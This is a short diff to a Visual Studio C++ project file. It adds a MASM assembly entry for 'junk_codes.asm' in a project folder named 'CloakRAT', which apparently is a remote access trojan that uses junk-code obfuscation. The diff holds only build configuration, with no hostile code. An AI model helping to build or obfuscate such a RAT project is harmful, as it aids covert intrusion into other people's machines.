@@ -139,6 +139,11 @@
     <ClInclude Include="TCPClient.h" />
     <ClInclude Include="utils.h" />
   </ItemGroup>
+  <ItemGroup>
+    <MASM Update="C:\Users\tal78\Desktop\Workspace\CloakRAT\Shared\junk_codes.asm">
+      <FileType>Document</FileType>
+    </MASM>
+  </ItemGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
   <ImportGroup Label="ExtensionTargets">
   </ImportGroup>
